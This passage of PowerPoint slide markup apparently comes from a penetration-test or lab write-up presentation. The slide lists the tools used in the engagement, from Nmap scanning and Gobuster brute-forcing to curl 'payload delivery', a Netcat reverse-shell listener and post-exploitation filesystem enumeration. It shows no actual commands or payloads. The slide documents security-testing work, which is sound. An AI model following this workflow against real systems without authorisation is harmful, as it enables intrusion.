            <a:r>
              <a:rPr lang="en-US" sz="1200" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Only tools actually used during the engagement are listed — nothing here is hypothetical.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1691640"/>
            <a:ext cx="3675888" cy="658368"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 11111"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141B2E"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="713232" y="1764792"/>
            <a:ext cx="3346704" cy="27432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ip / route</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="713232" y="2020824"/>
            <a:ext cx="3346704" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Local network interface &amp; routing info</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="713232" y="2221992"/>
            <a:ext cx="3346704" cy="201168"/>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Recon</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2441448"/>
            <a:ext cx="3675888" cy="658368"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 11111"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141B2E"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="713232" y="2514600"/>
            <a:ext cx="3346704" cy="27432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Nmap</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="713232" y="2770632"/>
            <a:ext cx="3346704" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Host discovery, port scan, service/version detection</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="713232" y="2971800"/>
            <a:ext cx="3346704" cy="201168"/>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Recon / Enum</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3191256"/>
            <a:ext cx="3675888" cy="658368"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 11111"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141B2E"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="713232" y="3264408"/>
            <a:ext cx="3346704" cy="27432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ftp (CLI)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="713232" y="3520440"/>
            <a:ext cx="3346704" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Anonymous login, directory listing, file retrieval</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="713232" y="3721608"/>
            <a:ext cx="3346704" cy="201168"/>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Enumeration</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Shape 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3941064"/>
            <a:ext cx="3675888" cy="658368"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 11111"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141B2E"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="713232" y="4014216"/>
            <a:ext cx="3346704" cy="27432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curl</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="713232" y="4270248"/>
            <a:ext cx="3346704" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>HTTP requests, source inspection, payload delivery</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 20"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="713232" y="4471416"/>
            <a:ext cx="3346704" cy="201168"/>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Enum / Exploit</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Shape 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4297680" y="1691640"/>
            <a:ext cx="3675888" cy="658368"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 11111"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141B2E"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4462272" y="1764792"/>
            <a:ext cx="3346704" cy="27432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WhatWeb</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Text 23"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4462272" y="2020824"/>
            <a:ext cx="3346704" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Web technology fingerprinting</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Text 24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4462272" y="2221992"/>
            <a:ext cx="3346704" cy="201168"/>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Web Enum</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Shape 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4297680" y="2441448"/>
            <a:ext cx="3675888" cy="658368"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 11111"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141B2E"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Text 26"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4462272" y="2514600"/>
            <a:ext cx="3346704" cy="27432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Gobuster</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Text 27"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4462272" y="2770632"/>
            <a:ext cx="3346704" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Directory / file brute-forcing</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Text 28"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4462272" y="2971800"/>
            <a:ext cx="3346704" cy="201168"/>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Web Enum</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Shape 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4297680" y="3191256"/>
            <a:ext cx="3675888" cy="658368"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 11111"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141B2E"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Text 30"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4462272" y="3264408"/>
            <a:ext cx="3346704" cy="27432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grep / sed</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Text 31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4462272" y="3520440"/>
            <a:ext cx="3346704" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Source-code and text searching</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="Text 32"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4462272" y="3721608"/>
            <a:ext cx="3346704" cy="201168"/>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Enum / Analysis</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Shape 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4297680" y="3941064"/>
            <a:ext cx="3675888" cy="658368"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 11111"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141B2E"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36" name="Text 34"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4462272" y="4014216"/>
            <a:ext cx="3346704" cy="27432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base64</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="37" name="Text 35"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4462272" y="4270248"/>
            <a:ext cx="3346704" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Decoding hidden HTML-comment clues</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="Text 36"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4462272" y="4471416"/>
            <a:ext cx="3346704" cy="201168"/>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Analysis</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="Shape 37"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8046720" y="1691640"/>
            <a:ext cx="3675888" cy="658368"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 11111"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141B2E"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Text 38"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8211312" y="1764792"/>
            <a:ext cx="3346704" cy="27432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Netcat (nc)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="41" name="Text 39"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8211312" y="2020824"/>
            <a:ext cx="3346704" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Reverse-shell listener / handler</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="42" name="Text 40"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8211312" y="2221992"/>
            <a:ext cx="3346704" cy="201168"/>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Exploitation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="43" name="Shape 41"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8046720" y="2441448"/>
            <a:ext cx="3675888" cy="658368"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 11111"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141B2E"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="44" name="Text 42"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8211312" y="2514600"/>
            <a:ext cx="3346704" cy="27432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find / stat / namei</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="45" name="Text 43"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8211312" y="2770632"/>
            <a:ext cx="3346704" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Filesystem &amp; permission enumeration</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="46" name="Text 44"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8211312" y="2971800"/>
            <a:ext cx="3346704" cy="201168"/>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Post-Exploit</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="47" name="Shape 45"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8046720" y="3191256"/>
            <a:ext cx="3675888" cy="658368"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 11111"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141B2E"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="48" name="Text 46"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8211312" y="3264408"/>
            <a:ext cx="3346704" cy="27432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file / readelf / strings / ldd / objdump / nm</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="49" name="Text 47"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
